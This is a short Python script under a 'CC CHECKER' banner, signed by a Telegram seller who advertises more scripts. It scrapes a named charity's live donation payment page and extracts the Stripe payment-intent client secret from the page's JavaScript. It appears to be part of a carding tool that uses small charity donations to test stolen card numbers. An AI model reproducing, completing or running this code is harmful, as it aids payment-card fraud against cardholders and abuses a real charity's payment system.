art = """

░█▀▀░█▀▀░░░█▀▀░█░█░█▀▀░█▀▀░█░█░█▀▀░█▀▄░░
░█░░░█░░░░░█░░░█▀█░█▀▀░█░░░█▀▄░█▀▀░█▀▄░░
░▀▀▀░▀▀▀░░░▀▀▀░▀░▀░▀▀▀░▀▀▀░▀░▀░▀▀▀░▀░▀░░
            by https://t.me/DarkSathanHell 
            Contact me if you want more script

"""


import requests
from bs4 import BeautifulSoup
from fake_useragent import UserAgent
import re

# URL of the webpage
url = "https://secure.nhscharitiestogether.co.uk/payment.aspx?amount=25&donationtype=One-off"


ua02 = UserAgent()
random_user_agent02 = ua02.random      # By https://t.me/DarkSathanHell 
            #Contact me if you want more script

hedders ={
    "user-agent": random_user_agent02    # By https://t.me/DarkSathanHell 
            #Contact me if you want more script
}

# Make an HTTP GET request to the URL
response = requests.get(url, headers=hedders)   # By https://t.me/DarkSathanHell 
            #Contact me if you want more script

# Check if the request was successful (status code 200)
if response.status_code == 200:
    # Parse the HTML content of the page
    soup = BeautifulSoup(response.text, 'html.parser')

    # Find all script tags
    script_tags = soup.find_all('script')    # By https://t.me/DarkSathanHell 
            #Contact me if you want more script

    # Initialize an empty string to store JavaScript code
    js_code = ""

    # Iterate through script tags and append their content to js_code
    for script_tag in script_tags:
        js_code += script_tag.string or ""

    # Extract the JavaScript code using a modified regular expression
    match = re.search(r'stripe\.confirmCardPayment\(([^)]+)\)', js_code)

    if match:
        # Extracted key
        extracted_key = re.search(r'"(pi_[^"]+)"', match.group(1))   # By https://t.me/DarkSathanHell 
            #Contact me if you want more script

        if extracted_key:
            # Assign the key to a new variable
            pi_key = extracted_key.group(1)
            match = re.match(r"([a-zA-Z0-9_-]+)_secret_([a-zA-Z0-9_-]+)", pi_key)
            if match:
                pi_before_secret = match.group(1)  # pdfgsgsfgsi_3OTMTYLfuclLIXb811hI64QC
                pi_after_secret = match.group(2)  # sfgsfsgsgCsfsfgsfIsdfsfsfsfKGMDAwZtC4Z3TpgyAWROmc0
            else:
                print("No match found")
            
        else:
            print("No match found for the key.")
    else:
        print("No match found for stripe.confirmCardPayment.")    
# By https://t.me/DarkSathanHell 
            #Contact me if you want more script
else:
    print(f"Failed to retrieve the page. Status code: {response.status_code}")


# By https://t.me/DarkSathanHell 
            #Contact me if you want more script